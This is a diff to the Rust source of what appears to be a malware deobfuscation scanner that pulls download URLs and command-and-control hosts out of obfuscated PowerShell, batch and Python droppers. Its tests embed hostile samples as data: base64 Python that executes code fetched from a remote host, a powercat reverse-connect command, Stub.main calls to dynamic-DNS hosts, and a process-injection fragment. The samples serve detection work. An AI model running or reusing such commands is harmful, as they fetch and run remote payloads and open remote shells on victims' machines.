+            "https://bitbucket.example/downloads/test.jpg",
+            "https://office.example/test.jpg",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == expected && line_hint == "powershell-concat-url"
+                )),
+                "concat URL {expected} missed: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn extracted_script_scan_decodes_no_paren_utf16_b64_concat_urls() {
+        let body = r#"
+$Bytes = 'htt';
+$Bytes2 = 'ps://';
+$base = $Bytes + $Bytes2;
+$links = @(($base + 'bitbucket.example/downloads/test.jpg'),($base + 'office.example/test.jpg'));
+"#;
+        let mut bytes = Vec::new();
+        for unit in body.encode_utf16() {
+            bytes.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(bytes);
+        let script = format!(
+            "$decoded = [Text.Encoding]::Unicode.GetString([Convert]::Frombase64string'{b64}')"
+        );
+        let mut env = Environment::new(&Config::default());
+
+        scan_extracted_script_text(&script, &mut env);
+
+        for expected in [
+            "https://bitbucket.example/downloads/test.jpg",
+            "https://office.example/test.jpg",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, line_hint }
+                        if src == expected && line_hint == "powershell-concat-url"
+                )),
+                "decoded concat URL {expected} missed: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn extracted_script_scan_compacts_long_opaque_base64_literals() {
+        let mut script = String::from("$blob = [Convert]::FromBase64String(\"");
+        script.push_str(&"A".repeat(64 * 1024));
+        script.push_str(
+            r#"")
+[Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero)
+"#,
+        );
+
+        let compacted = super::compact_long_base64_literals_for_script_scan(&script)
+            .expect("long base64 literal should be compacted");
+
+        assert!(compacted.len() < 4096, "compacted len={}", compacted.len());
+        assert!(compacted.contains("FromBase64String"));
+        assert!(compacted.contains("WriteProcessMemory"));
+        assert!(!compacted.contains(&"A".repeat(8192)));
+    }
+
+    #[test]
+    fn extracted_script_scan_compacts_sampled_base64_literal_fragments() {
+        let mut script = String::from("$blob = [Convert]::FromBase64String(\"");
+        script.push_str(&"A".repeat(48 * 1024));
+        script.push_str("\n# batdeob: omitted middle of large extracted PowerShell payload\n");
+        script.push_str(&"B".repeat(44 * 1024));
+        script.push_str(
+            r#"==")
+Start-Sleep -Seconds 9
+"#,
+        );
+
+        let compacted = super::compact_long_base64_literals_for_script_scan(&script)
+            .expect("sampled long base64 literal should be compacted");
+
+        assert!(compacted.len() < 4096, "compacted len={}", compacted.len());
+        assert!(compacted.contains("FromBase64String"));
+        assert!(compacted.contains("omitted middle of large extracted PowerShell payload"));
+        assert!(compacted.contains("Start-Sleep -Seconds 9"));
+        assert!(!compacted.contains(&"A".repeat(8192)));
+        assert!(!compacted.contains(&"B".repeat(8192)));
+    }
+}
+
+fn scan_plain_urls_in_deob_text(deobfuscated: &str, env: &mut Environment) {
     // Build a set of URLs already known
     let known = env.known_extracted_urls();
 
@@ -11635,14 +12323,14 @@ fn scan_resolved_powershell_fragment_downloads(
         max_output_line_bytes: env.limits.max_output_line_bytes,
         max_traits_per_kind: 100,
     });
+    payload_env.limits.deadline = env.limits.deadline;
     payload_env.vars = env.vars.clone();
 
     if contains_ascii_case_insensitive(text, "powershell")
         || contains_ascii_case_insensitive(text, "pwsh")
     {
         scan_embedded_powershell_invocations(text, &mut payload_env);
-    } else {
-        payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
+    } else if payload_env.push_extracted_ps1(text.as_bytes().to_vec()) {
         crate::ps1_scan::scan_ps1_payloads(&mut payload_env);
     }
 
@@ -11753,10 +12441,19 @@ fn is_var_fragment_url_boundary(ch: char) -> bool {
 }
 
 pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
-    let text = String::from_utf8_lossy(input);
-    if !text.contains("%!") {
+    if !input.windows(2).any(|window| window == b"%!") {
         return;
     }
+    if !input.windows(3).any(|window| window == b"://") {
+        return;
+    }
+    if !bytes_contain_ascii_case_insensitive(input, b"http")
+        && !bytes_contain_ascii_case_insensitive(input, b"ftp://")
+        && !bytes_contain_ascii_case_insensitive(input, b"file://")
+    {
+        return;
+    }
+    let text = String::from_utf8_lossy(input);
     let mut normalized = text.replace('^', "");
     normalized = normalized
         .replace("%!A%", "E")
@@ -11797,17 +12494,30 @@ pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
     }
 }
 
+fn bytes_contain_ascii_case_insensitive(haystack: &[u8], needle: &[u8]) -> bool {
+    !needle.is_empty()
+        && haystack
+            .windows(needle.len())
+            .any(|window| window.eq_ignore_ascii_case(needle))
+}
+
 pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
     if !has_embedded_powershell_invocation_atom(text) {
         return;
     }
     let normalized = text.replace('^', "");
     for line in normalized.lines() {
-        if command_starts_with_echo(line) {
+        if command_starts_with_echo(line) || command_is_comment_line(line) {
             continue;
         }
         for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
+            if powershell_match_is_assignment_staging(line, m.start()) {
+                continue;
+            }
             let tail = &line[m.start()..];
+            if powershell_tail_has_vbs_concat_residue(tail) {
+                continue;
+            }
             if !looks_like_embedded_powershell_payload(tail) {
                 continue;
             }
@@ -11815,6 +12525,47 @@ pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
         }
     }
     dedup_exec_ps1(env);
+}
+
+fn command_is_comment_line(line: &str) -> bool {
+    let trimmed = line
+        .trim_start()
+        .strip_prefix('@')
+        .unwrap_or_else(|| line.trim_start())
+        .trim_start();
+    trimmed.starts_with("::")
+        || trimmed.eq_ignore_ascii_case("rem")
+        || starts_with_ascii_case_insensitive(trimmed, "rem ")
+}
+
+fn powershell_match_is_assignment_staging(line: &str, match_start: usize) -> bool {
+    let prefix = line[..match_start].trim_start();
+    let prefix = prefix.strip_prefix('@').unwrap_or(prefix).trim_start();
+    let tokens = split_words(prefix);
+    let is_set_assignment = match tokens.as_slice() {
+        [cmd, ..] if strip_outer_quotes(cmd).eq_ignore_ascii_case("set") => true,
+        [cmd, subcmd, ..]
+            if strip_outer_quotes(cmd).eq_ignore_ascii_case("call")
+                && strip_outer_quotes(subcmd).eq_ignore_ascii_case("set") =>
+        {
+            true
+        }
+        _ => false,
+    };
+    is_set_assignment && prefix.contains('=')
+}
+
+fn powershell_tail_has_vbs_concat_residue(tail: &str) -> bool {
+    let Some(command_pos) = find_ascii_case_insensitive_from(tail, "-command", 0)
+        .or_else(|| find_ascii_case_insensitive_from(tail, "-c", 0))
+    else {
+        return false;
+    };
+    let payload = tail[command_pos..].trim();
+    payload.contains("\" &")
+        || payload.contains("& \"")
+        || payload.contains("' &")
+        || payload.contains("& '")
 }
 
 fn scan_embedded_powershell_downloads_in_deob_text(text: &str, env: &mut Environment) {
@@ -11833,6 +12584,7 @@ fn scan_embedded_powershell_downloads_in_deob_text(text: &str, env: &mut Environ
         max_output_line_bytes: env.limits.max_output_line_bytes,
         max_traits_per_kind: 100,
     });
+    payload_env.limits.deadline = env.limits.deadline;
     payload_env.vars = env.vars.clone();
 
     for line in normalized.lines() {
@@ -11953,7 +12705,8 @@ fn is_ascii_command_atom_end_boundary(haystack: &[u8], mut end: usize) -> bool {
 
 #[cfg(test)]
 mod embedded_powershell_invocation_gate_tests {
-    use super::has_embedded_powershell_invocation_atom;
+    use super::{has_embedded_powershell_invocation_atom, scan_embedded_powershell_invocations};
+    use crate::{env::Environment, Config};
 
     #[test]
     fn allows_plain_powershell_and_pwsh_atoms() {
@@ -11994,6 +12747,47 @@ mod embedded_powershell_invocation_gate_tests {
             "^p ^o ^w ^not ^a ^shell command"
         ));
     }
+
+    #[test]
+    fn embedded_scan_ignores_powershell_inside_set_staging_assignments() {
+        let mut env = Environment::new(&Config::default());
+        scan_embedded_powershell_invocations(
+            r#"call set "PSCMD=powershell -Command "function Stage { [Reflection.Assembly]::Load($bytes)"
+set "PSCMD=powershell -Command "Invoke-WebRequest -Uri https://staged.example/p.ps1"
+start powershell -Command "Invoke-WebRequest -Uri https://actual.example/p.ps1""#,
+            &mut env,
+        );
+
+        let payloads = env
+            .exec_ps1
+            .iter()
+            .map(|payload| String::from_utf8_lossy(payload).into_owned())
+            .collect::<Vec<_>>();
+        assert_eq!(
+            payloads.len(),
+            1,
+            "assignment staging prefixes should not be extracted as child scripts: {payloads:?}"
+        );
+        assert!(
+            payloads[0].contains("https://actual.example/p.ps1"),
+            "actual PowerShell launch was not preserved: {payloads:?}"
+        );
+    }
+
+    #[test]
+    fn embedded_scan_ignores_vbs_concat_command_tail() {
+        let mut env = Environment::new(&Config::default());
+        scan_embedded_powershell_invocations(
+            r#"decathlo = "cmd.exe /c ping 127.0.0.1 -n 10 & powershell -command " & hipercloridria"#,
+            &mut env,
+        );
+        assert!(
+            env.exec_ps1.is_empty() && env.all_extracted_ps1.is_empty(),
+            "VBS concat fragment should not be extracted as PowerShell: exec={:?} all={:?}",
+            env.exec_ps1,
+            env.all_extracted_ps1
+        );
+    }
 }
 
 fn looks_like_embedded_powershell_payload(tail: &str) -> bool {
@@ -12012,6 +12806,13 @@ fn looks_like_embedded_powershell_payload(tail: &str) -> bool {
     contains_ascii_case_insensitive(tail, "frombase64string")
         || contains_ascii_case_insensitive(tail, "http://")
         || contains_ascii_case_insensitive(tail, "https://")
+        || looks_like_embedded_powershell_skip_nth_body(tail)
+}
+
+fn looks_like_embedded_powershell_skip_nth_body(tail: &str) -> bool {
+    contains_ascii_case_insensitive(tail, "function")
+        && contains_ascii_case_insensitive(tail, "until (!$")
+        && contains_ascii_case_insensitive(tail, "$")
 }
 
 /// Matches PS download-verb tokens (alias or full cmdlet) at command
@@ -12069,7 +12870,7 @@ static B64_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
 #[expect(clippy::expect_used, reason = "static regex construction")]
 static DAMAGED_SCHEME_URL_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?i)(?:^|[^A-Za-z])([A-Za-z0-9_%!$:~,\-]{0,80})://([A-Za-z0-9][A-Za-z0-9.\-]{2,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^\s"'<>)]*)?)"#,
+        r#"(?i)(?:^|[^A-Za-z])([A-Za-z0-9_%!$:~,\-]{0,80})://((?:[A-Za-z0-9][A-Za-z0-9.\-]{2,}\.[A-Za-z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?(?:/[^\s"'<>)]*)?)"#,
     )
     .expect("damaged scheme URL regex")
 });
@@ -12119,6 +12920,12 @@ fn is_high_confidence_damaged_download_url(prefix: &str, host_path: &str, line: 
         || prefix.contains('%')
         || prefix.contains('!')
         || contains_ascii_case_insensitive(line, ":~");
+    if is_public_ip_payload_host_path(host_path) {
+        return true;
+    }
+    if is_damaged_scheme_invocation_line(line) && is_explicit_port_script_endpoint(host_path) {
+        return true;
+    }
     if !has_cmd_substring_artifact {
         return false;
     }
@@ -12144,6 +12951,53 @@ fn is_high_confidence_damaged_download_url(prefix: &str, host_path: &str, line: 
     }
 
     contains_ascii_case_insensitive(line, "url")
+        && host_path
+            .split(['?', '#'])
+            .next()
+            .is_some_and(has_payload_file_extension)
+}
+
+fn is_damaged_scheme_invocation_line(line: &str) -> bool {
+    line.contains("('://")
+        || line.contains("(\"://")
+        || line.contains("(''://")
+        || line.contains("(\"\"://")
+}
+
+fn is_explicit_port_script_endpoint(host_path: &str) -> bool {
+    let Some((host_port, path)) = host_path.split_once('/') else {
+        return false;
+    };
+    if !host_port.contains(':') {
+        return false;
+    }
+    let path = path.split(['?', '#']).next().unwrap_or(path);
+    [".php", ".asp", ".aspx", ".jsp"]
+        .iter()
+        .any(|ext| path.ends_with(ext))
+}
+
+fn is_public_ip_payload_host_path(host_path: &str) -> bool {
+    let Some(host_port) = host_path.split('/').next() else {
+        return false;
+    };
+    let host = host_port.split(':').next().unwrap_or(host_port);
+    let mut parts = host.split('.');
+    let valid_ipv4 = matches!(
+        (
+            parts.next().and_then(|part| part.parse::<u8>().ok()),
+            parts.next().and_then(|part| part.parse::<u8>().ok()),
+            parts.next().and_then(|part| part.parse::<u8>().ok()),
+            parts.next().and_then(|part| part.parse::<u8>().ok()),
+            parts.next(),
+        ),
+        (Some(_), Some(_), Some(_), Some(_), None)
+    );
+    if !valid_ipv4 {
+        return false;
+    }
+    let candidate = format!("https://{host_path}");
+    !is_noise_ip(&candidate)
         && host_path
             .split(['?', '#'])
             .next()
@@ -13137,6 +13991,8 @@ pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
 
 pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
     use base64::Engine;
+    scan_regex_replace_base64_powershell_urls(deobfuscated, env);
+
     let known = env.known_extracted_urls();
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
     let mut seen_b64: std::collections::HashSet<&str> = std::collections::HashSet::new();
@@ -13156,12 +14012,10 @@ pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
         //   (b) a PS one-liner with one or more URLs embedded (Data.ps1 /
         //       Datanew.ps1 / yenisc2.ps1 / stub.ps1 family — the whole
         //       script is a single FromBase64String wrapped in `iex`).
-        // Decode UTF-8 first; fall back to lossy so a stray binary tail
-        // doesn't sink an otherwise-readable PS payload.
-        let text = match String::from_utf8(decoded) {
-            Ok(s) => s,
-            Err(e) => String::from_utf8_lossy(&e.into_bytes()).into_owned(),
-        };
+        // Decode likely UTF-16LE PowerShell bodies as script text; otherwise
+        // fall back to lossy UTF-8 so a stray binary tail does not sink an
+        // otherwise-readable payload.
+        let text = decode_probable_script_text(&decoded);
         let trimmed = text.trim();
         // (a) bare-URL fast path — preserves prior behaviour.
         if (trimmed.starts_with("http://")
@@ -13187,6 +14041,7 @@ pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
         // keep the regex's worst case predictable on a maxed-out 8000-char
         // b64 input.
         let scan = &text[..floor_char_boundary(&text, 8192)];
+        scan_powershell_concat_urls(scan, env);
         for c2 in URL_RE.captures_iter(scan) {
             let Some(m) = c2.get(1) else { continue };
             let url = trim_url_suffix(m.as_str());
@@ -13202,6 +14057,153 @@ pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
             });
         }
     }
+}
+
+fn scan_regex_replace_base64_powershell_urls(deobfuscated: &str, env: &mut Environment) {
+    if !contains_ascii_case_insensitive(deobfuscated, "frombase64string")
+        || !contains_ascii_case_insensitive(deobfuscated, "[regex]::replace")
+    {
+        return;
+    }
+
+    use base64::Engine;
+    let mut bindings = std::collections::HashMap::new();
+    for caps in PS_STRING_ASSIGN_RE.captures_iter(deobfuscated) {
+        let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
+            continue;
+        };
+        bindings.insert(
+            name.as_str().to_ascii_lowercase(),
+            value.as_str().to_string(),
+        );
+    }
+
+    let mut seen_decoded = std::collections::HashSet::new();
+    for caps in PS_REGEX_REPLACE_B64_CALL_RE
+        .captures_iter(deobfuscated)
+        .take(16)
+    {
+        let (Some(var), Some(needle), Some(replacement)) = (caps.get(1), caps.get(2), caps.get(3))
+        else {
+            continue;
+        };
+        let Some(encoded) = bindings.get(&var.as_str().to_ascii_lowercase()) else {
+            continue;
+        };
+        let encoded = encoded.replace(needle.as_str(), replacement.as_str());
+        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(encoded) else {
+            continue;
+        };
+        let decoded = decode_probable_script_text(&decoded);
+        if !seen_decoded.insert(decoded.clone()) {
+            continue;
+        }
+        scan_extracted_script_text(&decoded, env);
+        scan_powershell_concat_urls(&decoded, env);
+    }
+}
+
+fn decode_probable_script_text(bytes: &[u8]) -> String {
+    if bytes.len() >= 4 && bytes.len() % 2 == 0 {
+        let nul_odd = bytes
+            .iter()
+            .enumerate()
+            .filter(|(idx, byte)| idx % 2 == 1 && **byte == 0)
+            .count();
+        if nul_odd.saturating_mul(2) >= bytes.len() / 2 {
+            let units: Vec<u16> = bytes
+                .chunks_exact(2)
+                .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
+                .collect();
+            return String::from_utf16_lossy(&units);
+        }
+    }
+    String::from_utf8_lossy(bytes).into_owned()
+}
+
+fn scan_powershell_concat_urls(text: &str, env: &mut Environment) {
+    if !text.contains('+')
+        || (!contains_ascii_case_insensitive(text, "http")
+            && !contains_ascii_case_insensitive(text, "ps://")
+            && !contains_ascii_case_insensitive(text, "tp://"))
+    {
+        return;
+    }
+
+    let mut bindings = std::collections::HashMap::new();
+    for caps in PS_STRING_ASSIGN_RE.captures_iter(text) {
+        let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
+            continue;
+        };
+        bindings.insert(
+            name.as_str().to_ascii_lowercase(),
+            value.as_str().to_string(),
+        );
+    }
+    for _ in 0..4 {
+        let mut changed = false;
+        for caps in PS_CONCAT_ASSIGN_RE.captures_iter(text) {
+            let (Some(name), Some(expr)) = (caps.get(1), caps.get(2)) else {
+                continue;
+            };
+            let Some(value) = resolve_ps_concat_expr(expr.as_str(), &bindings) else {
+                continue;
+            };
+            let key = name.as_str().to_ascii_lowercase();
+            if bindings.get(&key) != Some(&value) {
+                bindings.insert(key, value);
+                changed = true;
+            }
+        }
+        if !changed {
+            break;
+        }
+    }
+
+    let known = env.known_extracted_urls();
+    let mut seen = std::collections::HashSet::new();
+    for caps in PS_CONCAT_EXPR_RE.captures_iter(text).take(128) {
+        let Some(expr) = caps.get(1) else { continue };
+        let Some(resolved) = resolve_ps_concat_expr(expr.as_str(), &bindings) else {
+            continue;
+        };
+        for url_caps in URL_RE.captures_iter(&resolved) {
+            let Some(url_match) = url_caps.get(1) else {
+                continue;
+            };
+            let url = trim_url_suffix(url_match.as_str()).to_string();
+            if url.len() < 8
+                || is_noise_url(&url)
+                || known.contains(&url)
+                || !seen.insert(url.clone())
+            {
+                continue;
+            }
+            env.traits.push(Trait::DownloadInDeobText {
+                src: url,
+                line_hint: "powershell-concat-url".to_string(),
+            });
+        }
+    }
+}
+
+fn resolve_ps_concat_expr(
+    expr: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let mut out = String::new();
+    let mut parts = 0usize;
+    for caps in PS_CONCAT_PART_RE.captures_iter(expr) {
+        if let Some(name) = caps.get(1) {
+            out.push_str(bindings.get(&name.as_str().to_ascii_lowercase())?);
+        } else if let Some(value) = caps.get(2) {
+            out.push_str(value.as_str());
+        } else if let Some(value) = caps.get(3) {
+            out.push_str(value.as_str());
+        }
+        parts += 1;
+    }
+    (parts >= 2).then_some(out)
 }
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
@@ -13360,7 +14362,7 @@ pub fn scan_certutil_decoded_js(deobfuscated: &str, env: &mut Environment) {
                 continue;
             };
             let url = format!("https://{}", host_path.as_str());
-            if known.contains(&url) {
+            if is_known_or_known_scheme_variant(&known, &url) {
                 continue;
             }
             if !seen.insert(url.clone()) {
@@ -13418,7 +14420,7 @@ pub fn scan_echoed_unicode_js(deobfuscated: &str, env: &mut Environment) {
                 continue;
             };
             let url = format!("https://{}", host_path.as_str());
-            if known.contains(&url) {
+            if is_known_or_known_scheme_variant(&known, &url) {
                 continue;
             }
             if !seen.insert(url.clone()) {
@@ -13589,6 +14591,30 @@ static PS_TCP_CLIENT_RE: Lazy<Regex> = Lazy::new(|| {
         "#,
     )
     .expect("ps tcp client regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static STUB_MAIN_HOST_PORT_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?ix)
+            (?:
+                \b Stub (?: mainMain | \s* \. \s* main \s* : \s* Main )
+                |
+                \[ \s* Stubmain \s* \] \s* :: \s* Main
+                |
+                \[ \s* Stub \s* \. \s* main \s* \] \s* :: \s* Main
+            )
+            \s* \(? \s*
+            ['"]?
+            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,8}) )
+            ['"]?
+            \s* , \s*
+            ['"]?
+            (\d{1,5})
+            ['"]?
+        "#,
+    )
+    .expect("stub main host port regex")
 });
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
@@ -13834,6 +14860,29 @@ fn scan_remote_connects(deobfuscated: &str, env: &mut Environment) {
             }
             env.traits.push(Trait::RemoteConnect {
                 cmd: line.to_string(),
+                host,
+                port,
+            });
+        }
+        let cleaned_marker_line;
+        let stub_scan_line = if line.is_ascii() {
+            line
+        } else {
+            cleaned_marker_line = line.chars().filter(|ch| ch.is_ascii()).collect::<String>();
+            cleaned_marker_line.as_str()
+        };
+        for caps in STUB_MAIN_HOST_PORT_RE.captures_iter(stub_scan_line) {
+            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
+                continue;
+            };
+            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
+                continue;
+            };
+            if !seen.insert((host.clone(), port)) {
+                continue;
+            }
+            env.traits.push(Trait::RemoteConnect {
+                cmd: stub_scan_line.to_string(),
                 host,
                 port,
             });
@@ -14202,6 +15251,7 @@ mod noise_ip_tests {
             "https://music.yandex.ru/iframe/#track/"
         ));
         assert!(super::is_noise_url("https://www.google.com/maps/place/"));
+        assert!(super::is_noise_url("https://pyobfuscate.com"));
         assert!(super::is_noise_url("https://www.cyotek.com"));
         assert!(super::is_noise_url("http://sourceforge.net/p/compactview"));
         assert!(super::is_noise_url("http://www.skinstudio.netG"));
@@ -14677,6 +15727,42 @@ mod ps_tcp_client_tests {
     }
 
     #[test]
+    fn marker_polluted_stub_main_host_port_emits_remote_connect() {
+        let s = "powershell HiddenCommand〷 ꒤ ⪓ ⇉ ₳ \"[StubmainMain(〷 ꒤ ⪓ ⇉ ₳'carlossalazar.chickenkiller.com'〷 ꒤ ⪓ ⇉ ₳, 〷 ꒤ ⪓ ⇉ ₳'1996'〷 ꒤ ⪓ ⇉ ₳);\"";
+        assert_eq!(
+            connects(s),
+            vec![("carlossalazar.chickenkiller.com".to_string(), 1996)]
+        );
+    }
+
+    #[test]
+    fn cleaned_stub_main_host_port_emits_remote_connect() {
+        let s = r#"powershell "[Stub.main:Main('danielsanchez2.chickenkiller.com', '1996');""#;
+        assert_eq!(
+            connects(s),
+            vec![("danielsanchez2.chickenkiller.com".to_string(), 1996)]
+        );
+    }
+
+    #[test]
+    fn cleaned_bracket_stubmain_host_port_emits_remote_connect() {
+        let s = r#"powershell "[Stubmain]::Main'danielsanchez2.chickenkiller.com','1996';""#;
+        assert_eq!(
+            connects(s),
+            vec![("danielsanchez2.chickenkiller.com".to_string(), 1996)]
+        );
+    }
+
+    #[test]
+    fn cleaned_bracket_stub_dot_main_host_port_emits_remote_connect() {
+        let s = r#"powershell "[Stub.main]::Main('danielsanchez2.chickenkiller.com', '1996');""#;
+        assert_eq!(
+            connects(s),
+            vec![("danielsanchez2.chickenkiller.com".to_string(), 1996)]
+        );
+    }
+
+    #[test]
     fn powercat_reverse_connect_ip_port_flags() {
         let s = r#"powercat -c 45.82.69.203 -p 2080 -ep"#;
         assert_eq!(connects(s), vec![("45.82.69.203".to_string(), 2080)]);
@@ -14967,6 +16053,36 @@ mod inline_b64_url_extraction_tests {
             extracted,
             vec!["https://attacker-example.org/payload.exe".to_string()]
         );
+    }
+
+    #[test]
+    fn no_paren_utf16_b64_ps_body_concat_urls_surface() {
+        let body = r#"
+$Bytes = 'htt';
+$Bytes2 = 'ps://';
+$base = $Bytes + $Bytes2;
+$links = @(($base + 'bitbucket.example/downloads/test.jpg'),($base + 'office.example/test.jpg'));
+"#;
+        let mut bytes = Vec::new();
+        for unit in body.encode_utf16() {
+            bytes.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(bytes);
+        let script = format!(
+            "$decoded = [Text.Encoding]::Unicode.GetString([Convert]::Frombase64string'{b64}')"
+        );
+        let extracted = urls(&script);
+
+        for expected in [
+            "https://bitbucket.example/downloads/test.jpg",
+            "https://office.example/test.jpg",
+        ] {
+            assert!(
+                extracted.iter().any(|url| url == expected),
+                "expected {expected}, got {:?}",
+                extracted
+            );
+        }
     }
 
     #[test]
@@ -15438,7 +16554,8 @@ mod curl_redirect_parser_tests {
 mod liberal_url_scheme_tests {
     use super::{
         contains_liberal_url_scheme, decoded_python_b64decode_literals, is_noise_url_context,
-        normalize_liberal_url_token, scan_python_requests_get_deob_text,
+        normalize_liberal_url_token, scan_deob_text, scan_deob_text_shallow,
+        scan_python_requests_get_deob_text, scan_raw_marker_powershell_urls,
     };
     use crate::env::{Config, Environment};
     use crate::traits::Trait;
@@ -15505,6 +16622,46 @@ mod liberal_url_scheme_tests {
     }
 
     #[test]
+    fn raw_marker_powershell_scan_skips_marker_noise_without_url_scheme() {
+        let mut env = Environment::new(&Config::default());
+        let marker_noise = format!(
+            "{}://{}\r\npowersh%!A%ll write-host marker\r\n",
+            "A".repeat(256),
+            "%!A%".repeat(16_384)
+        );
+
+        scan_raw_marker_powershell_urls(marker_noise.as_bytes(), &mut env);
+
+        assert!(env.traits.is_empty(), "unexpected traits: {:?}", env.traits);
+    }
+
+    #[test]
+    fn deadline_bound_large_deob_text_still_surfaces_plain_urls() {
+        let mut env = Environment::new(&Config::default());
+        env.limits.deadline = Some(std::time::Instant::now() + std::time::Duration::from_secs(60));
+        let text = format!(
+            "{}\r\nset mas=https://large-deob.example/payload.exe\r\n{}",
+            "rem filler\r\n".repeat(24_000),
+            "echo tail\r\n".repeat(4)
+        );
+
+        scan_deob_text(&text, &mut env);
+
+        assert!(env.traits.iter().any(|t| matches!(
+            t,
+            Trait::UrlVariable { url, .. } if url == "https://large-deob.example/payload.exe"
+        ) || matches!(
+            t,
+            Trait::DownloadInDeobText { src, .. } if src == "https://large-deob.example/payload.exe"
+        )), "large shallow scan did not surface URL traits: {:?}", env.traits);
+        assert!(
+            !env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "large shallow scan should not mark timeout: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn duplicated_python_b64_literals_are_decoded_once() {
         use base64::Engine;
 
@@ -15513,5 +16670,65 @@ mod liberal_url_scheme_tests {
         let text = format!("exec(base64.b64decode('{b64}'))\nexec(base64.b64decode('{b64}'))");
         let decoded_literals = decoded_python_b64decode_literals(&text);
         assert_eq!(decoded_literals, vec![decoded.to_string()]);
+    }
+
+    #[test]
+    fn python_base64_decoded_urllib_urlopen_emits_download() {
+        use base64::Engine;
+
+        let decoded = "import urllib.request;exec(urllib.request.urlopen('https://python-b64-urlopen.example/stage').read())";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let mut env = Environment::new(&Config::default());
+
+        scan_python_requests_get_deob_text(
+            &format!("python -c \"import base64;exec(base64.b64decode('{b64}'))\""),
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://python-b64-urlopen.example/stage"
+            )),
+            "decoded urllib.request.urlopen URL was missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_base64_decoded_nested_urllib_urlopen_emits_download() {
+        let text = "cmd.exe /c start \"\" \"C:\\Users\\Public\\Downloads\\xmetavip2\\pw.exe\" -c \"import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8va2xpbmdwcmVtaXVtLnh5ei94bWV0YW9ubHl4d3JvbScpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykpKQ=='))\"";
+        let mut env = Environment::new(&Config::default());
+
+        scan_python_requests_get_deob_text(text, &mut env);
+
+        assert!(
+            env.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://klingpremium.xyz/xmetaonlyxwrom"
+            )),
+            "nested decoded urllib.request.urlopen URL was missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn shallow_scan_includes_python_base64_decoded_urlopen() {
+        let text = "cmd.exe /c start \"\" \"C:\\Users\\Public\\Downloads\\xmetavip2\\pw.exe\" -c \"import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8va2xpbmdwcmVtaXVtLnh5ei94bWV0YW9ubHl4d3JvbScpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykpKQ=='))\"";
+        let mut env = Environment::new(&Config::default());
+
+        scan_deob_text_shallow(text, &mut env);
+
+        assert!(
+            env.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::Download { src, .. }
+                    if src == "https://klingpremium.xyz/xmetaonlyxwrom"
+            )),
+            "shallow scan missed decoded Python URL: {:?}",
+            env.traits
+        );
     }
 }
